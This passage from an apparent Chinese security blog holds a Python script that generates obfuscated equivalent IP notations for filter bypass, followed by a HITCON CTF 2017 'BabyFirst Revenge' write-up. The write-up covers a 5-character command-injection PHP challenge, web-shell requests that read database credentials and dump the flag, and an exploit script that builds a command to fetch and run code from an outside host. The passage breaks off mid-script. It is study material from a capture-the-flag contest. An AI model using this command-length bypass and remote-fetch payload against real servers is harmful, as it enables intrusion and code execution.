supported</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    moreZero = random.choice(range(<span class="number">10</span>))</span><br><span class="line">    <span class="keyword">return</span> oct(int(x, <span class="number">16</span>)).zfill(moreZero + len(oct(int(x, <span class="number">16</span>)))).strip(<span class="string">'L'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hex2int</span><span class="params">(x)</span>:</span> <span class="keyword">return</span> str(int(x, <span class="number">16</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hex2hex</span><span class="params">(x)</span>:</span></span><br><span class="line">    moreZero = random.choice(range(<span class="number">10</span>))</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'0x'</span> + <span class="string">'0'</span> * moreZero + x</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = [hex2hex, hex2int, hex2oct]</span><br><span class="line">res = []</span><br><span class="line"><span class="comment"># "a.b.c.d"</span></span><br><span class="line"><span class="comment"># Each of the four numeric parts specifies a byte of the address;</span></span><br><span class="line"><span class="comment"># the bytes are assigned in left-to-right order to produce the binary address.</span></span><br><span class="line">res.extend([<span class="string">'.'</span>.join([i[<span class="number">0</span>](hi[<span class="number">0</span>]), i[<span class="number">1</span>](hi[<span class="number">1</span>]), i[<span class="number">2</span>](hi[<span class="number">2</span>]), i[<span class="number">3</span>](hi[<span class="number">3</span>])]) <span class="keyword">for</span> i <span class="keyword">in</span> it.product(p, p, p, p)])</span><br><span class="line"></span><br><span class="line"><span class="comment"># "a.b.c"</span></span><br><span class="line"><span class="comment"># Parts a and b specify the first two bytes of the binary address.</span></span><br><span class="line"><span class="comment"># Part c is interpreted as a 16-bit value that defines the rightmost two bytes of the binary address.</span></span><br><span class="line">res.extend([<span class="string">'.'</span>.join([i[<span class="number">0</span>](hi[<span class="number">0</span>]), i[<span class="number">1</span>](hi[<span class="number">1</span>]), i[<span class="number">2</span>](hi[<span class="number">4</span>])]) <span class="keyword">for</span> i <span class="keyword">in</span> it.product(p, p, p)])</span><br><span class="line"></span><br><span class="line"><span class="comment"># "a.b"</span></span><br><span class="line"><span class="comment"># Part a specifies the first byte of the binary address.</span></span><br><span class="line"><span class="comment"># Part b is interpreted as a 24-bit value that defines the rightmost three bytes of the binary address.</span></span><br><span class="line">res.extend([<span class="string">'.'</span>.join([i[<span class="number">0</span>](hi[<span class="number">0</span>]), i[<span class="number">1</span>](hi[<span class="number">5</span>])]) <span class="keyword">for</span> i <span class="keyword">in</span> it.product(p, p)])</span><br><span class="line"></span><br><span class="line"><span class="comment"># "a"</span></span><br><span class="line"><span class="comment"># The value a is interpreted as a 32-bit value that is stored directly into the binary address without any byte rearrangement.</span></span><br><span class="line">res.extend([<span class="string">'.'</span>.join([i[<span class="number">0</span>](hi[<span class="number">6</span>])]) <span class="keyword">for</span> i <span class="keyword">in</span> it.product(p)])</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(len(res)):</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"[%d]\t%s"</span> % (i, res[i])</span><br><span class="line"></span><br><span class="line"><span class="comment"># -------------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># test</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">except_ip = []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test_notation</span><span class="params">(ip_notation)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> except_ip</span><br><span class="line">    x = os.popen(<span class="string">'ping -n 1 -w 0.5 '</span> + ip_notation).readlines()</span><br><span class="line">    answer = x[<span class="number">0</span>] <span class="keyword">if</span> len(x) == <span class="number">1</span> <span class="keyword">else</span> x[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> ip <span class="keyword">not</span> <span class="keyword">in</span> answer:</span><br><span class="line">        except_ip.append(ip_notation)</span><br><span class="line">    <span class="keyword">return</span> answer.decode(<span class="string">'gbk'</span>).strip()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"\nchecking. . ."</span>,</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(len(res)):</span><br><span class="line">    <span class="comment"># print "[%d] %s\t\t\t%s" % (i, res[i], test_notation(res[i]))</span></span><br><span class="line">    test_notation(res[i])</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'.'</span>,</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"\n\ntotally %d notations of ip checked ,all are equivalent to %s"</span> % (len(res), ip)</span><br><span class="line"><span class="keyword">if</span> len(except_ip):</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"except for notations following:\n"</span>, except_ip</span><br></pre></td></tr></table></figure><h3 id="结果列表"><a href="#结果列表" class="headerlink" title="结果列表"></a>结果列表</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">0</span>]<span class="number">0x000c0</span><span class="number">.0</span>xa8<span class="number">.0</span>x0000042<span class="number">.0</span>x0e9</span><br><span class="line">[<span class="number">1</span>]<span class="number">0x0000c0</span><span class="number">.0</span>x0000000a8<span class="number">.0</span>x000042<span class="number">.233</span></span><br><span class="line">[<span class="number">2</span>]<span class="number">0x000000000c0</span><span class="number">.0</span>x000000000a8<span class="number">.0</span>x000000042<span class="number">.0000000000351</span></span><br><span class="line">[<span class="number">3</span>]<span class="number">0x000c0</span><span class="number">.0</span>x000000a8<span class="number">.66</span><span class="number">.0</span>x000000e9</span><br><span class="line">[<span class="number">4</span>]<span class="number">0xc0</span><span class="number">.0</span>xa8<span class="number">.66</span><span class="number">.233</span></span><br><span class="line">[<span class="number">5</span>]<span class="number">0x000000c0</span><span class="number">.0</span>x000000000a8<span class="number">.66</span><span class="number">.0351</span></span><br><span class="line">[<span class="number">6</span>]<span class="number">0x000000000c0</span><span class="number">.0</span>x00000000a8<span class="number">.0000102</span><span class="number">.0</span>x0000000e9</span><br><span class="line">[<span class="number">7</span>]<span class="number">0x0000c0</span><span class="number">.0</span>x000a8<span class="number">.00102</span><span class="number">.233</span></span><br><span class="line">[<span class="number">8</span>]<span class="number">0x00000000c0</span><span class="number">.0</span>x00000a8<span class="number">.00000000102</span><span class="number">.0000000351</span></span><br><span class="line">[<span class="number">9</span>]<span class="number">0x00c0</span><span class="number">.168</span><span class="number">.0</span>x0042<span class="number">.0</span>x00000e9</span><br><span class="line">[<span class="number">10</span>]<span class="number">0x000000c0</span><span class="number">.168</span><span class="number">.0</span>x00000000042<span class="number">.233</span></span><br><span class="line">[<span class="number">11</span>]<span class="number">0x0000000c0</span><span class="number">.168</span><span class="number">.0</span>x0042<span class="number">.0000000351</span></span><br><span class="line">[<span class="number">12</span>]<span class="number">0x00000000c0</span><span class="number">.168</span><span class="number">.66</span><span class="number">.0</span>x000000000e9</span><br><span class="line">[<span class="number">13</span>]<span class="number">0x000000c0</span><span class="number">.168</span><span class="number">.66</span><span class="number">.233</span></span><br><span class="line">[<span class="number">14</span>]<span class="number">0xc0</span><span class="number">.168</span><span class="number">.66</span><span class="number">.00351</span></span><br><span class="line">[<span class="number">15</span>]<span class="number">0xc0</span><span class="number">.168</span><span class="number">.0000102</span><span class="number">.0</span>x00000e9</span><br><span class="line">[<span class="number">16</span>]<span class="number">0x00c0</span><span class="number">.168</span><span class="number">.000000000102</span><span class="number">.233</span></span><br><span class="line">[<span class="number">17</span>]<span class="number">0x0000c0</span><span class="number">.168</span><span class="number">.00102</span><span class="number">.00000000351</span></span><br><span class="line">[<span class="number">18</span>]<span class="number">0x0000000c0</span><span class="number">.0000250</span><span class="number">.0</span>x00042<span class="number">.0</span>xe9</span><br><span class="line">[<span class="number">19</span>]<span class="number">0x000c0</span><span class="number">.0000000250</span><span class="number">.0</span>x000000042<span class="number">.233</span></span><br><span class="line">[<span class="number">20</span>]<span class="number">0x0c0</span><span class="number">.0000000250</span><span class="number">.0</span>x00042<span class="number">.00000000351</span></span><br><span class="line">[<span class="number">21</span>]<span class="number">0xc0</span><span class="number">.0000000250</span><span class="number">.66</span><span class="number">.0</span>xe9</span><br><span class="line">[<span class="number">22</span>]<span class="number">0x0000000c0</span><span class="number">.00000250</span><span class="number">.66</span><span class="number">.233</span></span><br><span class="line">[<span class="number">23</span>]<span class="number">0x000c0</span><span class="number">.00250</span><span class="number">.66</span><span class="number">.000000351</span></span><br><span class="line">[<span class="number">24</span>]<span class="number">0x00000c0</span><span class="number">.00000250</span><span class="number">.0000102</span><span class="number">.0</span>xe9</span><br><span class="line">[<span class="number">25</span>]<span class="number">0x00000c0</span><span class="number">.000250</span><span class="number">.00102</span><span class="number">.233</span></span><br><span class="line">[<span class="number">26</span>]<span class="number">0x000c0</span><span class="number">.00000250</span><span class="number">.0000000000102</span><span class="number">.00000351</span></span><br><span class="line">[<span class="number">27</span>]<span class="number">192.0</span>x000000000a8<span class="number">.0</span>x0042<span class="number">.0</span>x0e9</span><br><span class="line">[<span class="number">28</span>]<span class="number">192.0</span>x0000000a8<span class="number">.0</span>x0042<span class="number">.233</span></span><br><span class="line">[<span class="number">29</span>]<span class="number">192.0</span>x0000000a8<span class="number">.0</span>x0000042<span class="number">.0000351</span></span><br><span class="line">[<span class="number">30</span>]<span class="number">192.0</span>x000000a8<span class="number">.66</span><span class="number">.0</span>xe9</span><br><span class="line">[<span class="number">31</span>]<span class="number">192.0</span>x00000000a8<span class="number">.66</span><span class="number">.233</span></span><br><span class="line">[<span class="number">32</span>]<span class="number">192.0</span>x0000000a8<span class="number">.66</span><span class="number">.000351</span></span><br><span class="line">[<span class="number">33</span>]<span class="number">192.0</span>xa8<span class="number">.00102</span><span class="number">.0</span>x0000e9</span><br><span class="line">[<span class="number">34</span>]<span class="number">192.0</span>x00a8<span class="number">.00102</span><span class="number">.233</span></span><br><span class="line">[<span class="number">35</span>]<span class="number">192.0</span>x00000a8<span class="number">.000102</span><span class="number">.0000000000351</span></span><br><span class="line">[<span class="number">36</span>]<span class="number">192.168</span><span class="number">.0</span>x42<span class="number">.0</span>xe9</span><br><span class="line">[<span class="number">37</span>]<span class="number">192.168</span><span class="number">.0</span>x000042<span class="number">.233</span></span><br><span class="line">[<span class="number">38</span>]<span class="number">192.168</span><span class="number">.0</span>x0000000042<span class="number">.000000351</span></span><br><span class="line">[<span class="number">39</span>]<span class="number">192.168</span><span class="number">.66</span><span class="number">.0</span>x000000000e9</span><br><span class="line">[<span class="number">40</span>]<span class="number">192.168</span><span class="number">.66</span><span class="number">.233</span></span><br><span class="line">[<span class="number">41</span>]<span class="number">192.168</span><span class="number">.66</span><span class="number">.0000351</span></span><br><span class="line">[<span class="number">42</span>]<span class="number">192.168</span><span class="number">.000102</span><span class="number">.0</span>x00e9</span><br><span class="line">[<span class="number">43</span>]<span class="number">192.168</span><span class="number">.00000102</span><span class="number">.233</span></span><br><span class="line">[<span class="number">44</span>]<span class="number">192.168</span><span class="number">.00000000102</span><span class="number">.00000351</span></span><br><span class="line">[<span class="number">45</span>]<span class="number">192.0000000250</span><span class="number">.0</span>x0000000042<span class="number">.0</span>x000e9</span><br><span class="line">[<span class="number">46</span>]<span class="number">192.000250</span><span class="number">.0</span>x00000000042<span class="number">.233</span></span><br><span class="line">[<span class="number">47</span>]<span class="number">192.0250</span><span class="number">.0</span>x000000042<span class="number">.0351</span></span><br><span class="line">[<span class="number">48</span>]<span class="number">192.000250</span><span class="number">.66</span><span class="number">.0</span>x000000e9</span><br><span class="line">[<span class="number">49</span>]<span class="number">192.0000250</span><span class="number">.66</span><span class="number">.233</span></span><br><span class="line">[<span class="number">50</span>]<span class="number">192.0000000000250</span><span class="number">.66</span><span class="number">.000351</span></span><br><span class="line">[<span class="number">51</span>]<span class="number">192.000000000250</span><span class="number">.00000102</span><span class="number">.0</span>xe9</span><br><span class="line">[<span class="number">52</span>]<span class="number">192.00250</span><span class="number">.0000000102</span><span class="number">.233</span></span><br><span class="line">[<span class="number">53</span>]<span class="number">192.0250</span><span class="number">.00000000102</span><span class="number">.0351</span></span><br><span class="line">[<span class="number">54</span>]<span class="number">0000000300.0</span>x000a8<span class="number">.0</span>x0000000042<span class="number">.0</span>x0000e9</span><br><span class="line">[<span class="number">55</span>]<span class="number">000000000300.0</span>x000000000a8<span class="number">.0</span>x0000000042<span class="number">.233</span></span><br><span class="line">[<span class="number">56</span>]<span class="number">0000000300.0</span>x000000a8<span class="number">.0</span>x00000042<span class="number">.000351</span></span><br><span class="line">[<span class="number">57</span>]<span class="number">0000000300.0</span>x0000a8<span class="number">.66</span><span class="number">.0</span>x000000000e9</span><br><span class="line">[<span class="number">58</span>]<span class="number">0000000000300.0</span>x00000000a8<span class="number">.66</span><span class="number">.233</span></span><br><span class="line">[<span class="number">59</span>]<span class="number">0000000300.0</span>x0a8<span class="number">.66</span><span class="number">.0000351</span></span><br><span class="line">[<span class="number">60</span>]<span class="number">0000300.0</span>x00a8<span class="number">.0102</span><span class="number">.0</span>x00e9</span><br><span class="line">[<span class="number">61</span>]<span class="number">0000300.0</span>x0000000a8<span class="number">.000102</span><span class="number">.233</span></span><br><span class="line">[<span class="number">62</span>]<span class="number">000000300.0</span>x000000000a8<span class="number">.00102</span><span class="number">.00000000351</span></span><br><span class="line">[<span class="number">63</span>]<span class="number">0000300.168</span><span class="number">.0</span>x000042<span class="number">.0</span>xe9</span><br><span class="line">[<span class="number">64</span>]<span class="number">0300.168</span><span class="number">.0</span>x042<span class="number">.233</span></span><br><span class="line">[<span class="number">65</span>]<span class="number">0000000300.168</span><span class="number">.0</span>x0000000042<span class="number">.0000351</span></span><br><span class="line">[<span class="number">66</span>]<span class="number">0000000300.168</span><span class="number">.66</span><span class="number">.0</span>x000000000e9</span><br><span class="line">[<span class="number">67</span>]<span class="number">000300.168</span><span class="number">.66</span><span class="number">.233</span></span><br><span class="line">[<span class="number">68</span>]<span class="number">0000300.168</span><span class="number">.66</span><span class="number">.00000351</span></span><br><span class="line">[<span class="number">69</span>]<span class="number">000000000300.168</span><span class="number">.00102</span><span class="number">.0</span>x00e9</span><br><span class="line">[<span class="number">70</span>]<span class="number">0300.168</span><span class="number">.000000000102</span><span class="number">.233</span></span><br><span class="line">[<span class="number">71</span>]<span class="number">0000300.168</span><span class="number">.000000102</span><span class="number">.00000351</span></span><br><span class="line">[<span class="number">72</span>]<span class="number">0000000000300.00000000250</span><span class="number">.0</span>x0042<span class="number">.0</span>x00000000e9</span><br><span class="line">[<span class="number">73</span>]<span class="number">00300.000000000250</span><span class="number">.0</span>x42<span class="number">.233</span></span><br><span class="line">[<span class="number">74</span>]<span class="number">00000300.000250</span><span class="number">.0</span>x00000000042<span class="number">.0000351</span></span><br><span class="line">[<span class="number">75</span>]<span class="number">000300.000000250</span><span class="number">.66</span><span class="number">.0</span>x000000000e9</span><br><span class="line">[<span class="number">76</span>]<span class="number">0000000000300.000000250</span><span class="number">.66</span><span class="number">.233</span></span><br><span class="line">[<span class="number">77</span>]<span class="number">000000300.0250</span><span class="number">.66</span><span class="number">.00000351</span></span><br><span class="line">[<span class="number">78</span>]<span class="number">0000000300.000250</span><span class="number">.000000102</span><span class="number">.0</span>xe9</span><br><span class="line">[<span class="number">79</span>]<span class="number">000300.00000000250</span><span class="number">.000102</span><span class="number">.233</span></span><br><span class="line">[<span class="number">80</span>]<span class="number">000000000300.0000000250</span><span class="number">.000102</span><span class="number">.0000000000351</span></span><br><span class="line">[<span class="number">81</span>]<span class="number">0x000000c0</span><span class="number">.0</span>x00a8<span class="number">.0</span>x42e9</span><br><span class="line">[<span class="number">82</span>]<span class="number">0x0000c0</span><span class="number">.0</span>x000a8<span class="number">.17129</span></span><br><span class="line">[<span class="number">83</span>]<span class="number">0x000000c0</span><span class="number">.0</span>x0000a8<span class="number">.00041351</span></span><br><span class="line">[<span class="number">84</span>]<span class="number">0x000000000c0</span><span class="number">.168</span><span class="number">.0</span>x000042e9</span><br><span class="line">[<span class="number">85</span>]<span class="number">0x0000c0</span><span class="number">.168</span><span class="number">.17129</span></span><br><span class="line">[<span class="number">86</span>]<span class="number">0x0000c0</span><span class="number">.168</span><span class="number">.000041351</span></span><br><span class="line">[<span class="number">87</span>]<span class="number">0x0000000c0</span><span class="number">.00000000250</span><span class="number">.0</span>x000000042e9</span><br><span class="line">[<span class="number">88</span>]<span class="number">0x00000c0</span><span class="number">.000000000250</span><span class="number">.17129</span></span><br><span class="line">[<span class="number">89</span>]<span class="number">0x000c0</span><span class="number">.00250</span><span class="number">.00041351</span></span><br><span class="line">[<span class="number">90</span>]<span class="number">192.0</span>x0a8<span class="number">.0</span>x0000000042e9</span><br><span class="line">[<span class="number">91</span>]<span class="number">192.0</span>x000a8<span class="number">.17129</span></span><br><span class="line">[<span class="number">92</span>]<span class="number">192.0</span>x000000a8<span class="number">.0041351</span></span><br><span class="line">[<span class="number">93</span>]<span class="number">192.168</span><span class="number">.0</span>x000042e9</span><br><span class="line">[<span class="number">94</span>]<span class="number">192.168</span><span class="number">.17129</span></span><br><span class="line">[<span class="number">95</span>]<span class="number">192.168</span><span class="number">.00041351</span></span><br><span class="line">[<span class="number">96</span>]<span class="number">192.00250</span><span class="number">.0</span>x000000042e9</span><br><span class="line">[<span class="number">97</span>]<span class="number">192.0250</span><span class="number">.17129</span></span><br><span class="line">[<span class="number">98</span>]<span class="number">192.000000000250</span><span class="number">.000041351</span></span><br><span class="line">[<span class="number">99</span>]<span class="number">00000300.0</span>x00000a8<span class="number">.0</span>x000000042e9</span><br><span class="line">[<span class="number">100</span>]<span class="number">000000000300.0</span>x00000a8<span class="number">.17129</span></span><br><span class="line">[<span class="number">101</span>]<span class="number">00000300.0</span>x000a8<span class="number">.00000000041351</span></span><br><span class="line">[<span class="number">102</span>]<span class="number">0300.168</span><span class="number">.0</span>x000000042e9</span><br><span class="line">[<span class="number">103</span>]<span class="number">0300.168</span><span class="number">.17129</span></span><br><span class="line">[<span class="number">104</span>]<span class="number">00000000300.168</span><span class="number">.00000000041351</span></span><br><span class="line">[<span class="number">105</span>]<span class="number">0300.000000000250</span><span class="number">.0</span>x0042e9</span><br><span class="line">[<span class="number">106</span>]<span class="number">000000000300.0000250</span><span class="number">.17129</span></span><br><span class="line">[<span class="number">107</span>]<span class="number">000000000300.00250</span><span class="number">.00000000041351</span></span><br><span class="line">[<span class="number">108</span>]<span class="number">0x0c0</span><span class="number">.0</span>x00000a842e9</span><br><span class="line">[<span class="number">109</span>]<span class="number">0x00c0</span><span class="number">.11027177</span></span><br><span class="line">[<span class="number">110</span>]<span class="number">0x000000c0</span><span class="number">.0052041351</span></span><br><span class="line">[<span class="number">111</span>]<span class="number">192.0</span>x0000a842e9</span><br><span class="line">[<span class="number">112</span>]<span class="number">192.11027177</span></span><br><span class="line">[<span class="number">113</span>]<span class="number">192.000000000052041351</span></span><br><span class="line">[<span class="number">114</span>]<span class="number">00000300.0</span>x0000000a842e9</span><br><span class="line">[<span class="number">115</span>]<span class="number">0000000300.11027177</span></span><br><span class="line">[<span class="number">116</span>]<span class="number">0000000300.000000000052041351</span></span><br><span class="line">[<span class="number">117</span>]<span class="number">0x0000000c0a842e9</span></span><br><span class="line">[<span class="number">118</span>]<span class="number">3232252649</span></span><br><span class="line">[<span class="number">119</span>]<span class="number">000000030052041351</span></span><br><span class="line"></span><br><span class="line">checking. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . </span><br><span class="line"></span><br><span class="line">totally <span class="number">120</span> notations of ip checked ,all are equivalent to <span class="number">192.168</span><span class="number">.66</span><span class="number">.233</span></span><br><span class="line">[Finished <span class="keyword">in</span> <span class="number">3.1</span>s]</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>HITCON CTF 2017 BabyFirst Revenge and v2 writeup</title>
      <link href="/171112HITCONCTFBabyfirstRevengeSeriesWP/"/>
      <url>/171112HITCONCTFBabyfirstRevengeSeriesWP/</url>
      
        <content type="html"><![CDATA[<blockquote><p>from HITCON CTF 2017<br>2017/11/04 02:00 UTC ~ 2017/11/06 02:00 UTC</p><p><a href="https://ctf2017.hitcon.org/" target="_blank" rel="noopener">https://ctf2017.hitcon.org/</a></p></blockquote><h3 id="BabyFirst-Revenge"><a href="#BabyFirst-Revenge" class="headerlink" title="BabyFirst Revenge"></a>BabyFirst Revenge</h3><blockquote><p>Do you remember <a href="https://github.com/orangetw/My-CTF-Web-Challenges#babyfirst" target="_blank" rel="noopener">BabyFirst</a> from HITCON CTF 2015?</p><p>This is the harder version!</p><p><a href="http://52.199.204.34/" target="_blank" rel="noopener">http://52.199.204.34/</a></p></blockquote><h4 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $sandbox = <span class="string">'/www/sandbox/'</span> . md5(<span class="string">"orange"</span> . $_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    @chdir($sandbox);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'cmd'</span>]) &amp;&amp; strlen($_GET[<span class="string">'cmd'</span>]) &lt;= <span class="number">5</span>) &#123;</span><br><span class="line">        @exec($_GET[<span class="string">'cmd'</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'reset'</span>])) &#123;</span><br><span class="line">        @exec(<span class="string">'/bin/rm -rf '</span> . $sandbox);</span><br><span class="line">    &#125;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><h4 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h4><p>详细说明：<a href="https://findneo.github.io/171110Bypass4CLimit/">https://findneo.github.io/171110Bypass4CLimit/</a> </p><p>拿到shell后在<code>/home/fl4444g/README.txt</code>  得到数据库配置信息，然后连接数据库得到flag。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">http://52.199.204.34/sandbox/___MD5___of___ip/shell.php?cmd=cat%20/home/fl4444g/README.txt</span><br><span class="line"><span class="comment">#    Flag is in the MySQL database</span></span><br><span class="line"><span class="comment">#fl4444g / SugZXUtgeJ52_Bvr</span></span><br><span class="line"></span><br><span class="line">http://52.199.204.34/sandbox/___MD5___of___ip/fun.php?cmd=mysql -ufl4444g -pSugZXUtgeJ52_Bvr -e "show databases;"</span><br><span class="line"><span class="comment">#    Database</span></span><br><span class="line"><span class="comment">#information_schema</span></span><br><span class="line"><span class="comment">#fl4gdb</span></span><br><span class="line"></span><br><span class="line">http://52.199.204.34/sandbox/___MD5___of___ip/fun.php?cmd=mysql -ufl4444g -pSugZXUtgeJ52_Bvr -e "select concat(table_name) from information_schema.tables where table_schema='fl4gdb';"</span><br><span class="line"><span class="comment">#    concat(table_name)</span></span><br><span class="line"><span class="comment">#this_is_the_fl4g</span></span><br><span class="line"></span><br><span class="line">http://52.199.204.34/sandbox/___MD5___of___ip/fun.php?cmd=mysql -ufl4444g -pSugZXUtgeJ52_Bvr -e "use fl4gdb;select * from this_is_the_fl4g"</span><br><span class="line"><span class="comment">#    secret</span></span><br><span class="line"><span class="comment">#hitcon&#123;idea_from_phith0n,thank_you:)&#125;</span></span><br></pre></td></tr></table></figure><p><img src="getFlag.png" alt=""></p><h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># by https://findneo.github.io/</span></span><br><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> r</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">url = <span class="string">'http://52.199.204.34/'</span></span><br><span class="line"><span class="comment"># 查询自己的IP</span></span><br><span class="line">ip = r.get(<span class="string">'http://ipv4.icanhazip.com/'</span>).text.strip()</span><br><span class="line">sandbox = url + <span class="string">'sandbox/'</span> + hashlib.md5(<span class="string">'orange'</span> + ip).hexdigest() + <span class="string">'/'</span></span><br><span class="line"></span><br><span class="line">reset = url + <span class="string">'?reset'</span></span><br><span class="line">cmd = url + <span class="string">'?cmd='</span></span><br><span class="line">build = [<span class="string">'&gt;cur\\'</span>,</span><br><span class="line">         <span class="string">'&gt;l\ \\'</span>,</span><br><span class="line">         <span class="string">'ls&gt;A'</span>,</span><br><span class="line">         <span class="string">'rm c*'</span>,</span><br><span class="line">         <span class="string">'rm l*'</span>,</span><br><span class="line">         <span class="string">'&gt;105\\'</span>,</span><br><span class="line">         <span class="string">'&gt;304\\'</span>,</span><br><span class="line">         <span class="string">'&gt;301\\'</span>,</span><br><span class="line">         <span class="string">'&gt;9\&gt;\\'</span>,</span><br><span class="line">         <span class="string">'ls&gt;&gt;A'</span>,</span><br><span class="line">         <span class="string">'sh A'</span>,</span><br><span class="line">         <span class="string">'php A'</span></span><br><span class="line">         ]</span><br><span class="line"><span class="comment"># 如果目标服务器有GET，这个也是可以打的</span></span><br><span class="line"><span class="comment"># build = ['&gt;GE\\',</span></span><br><span class="line"><span class="comment">#          '&gt;T\\ \\',</span></span><br><span 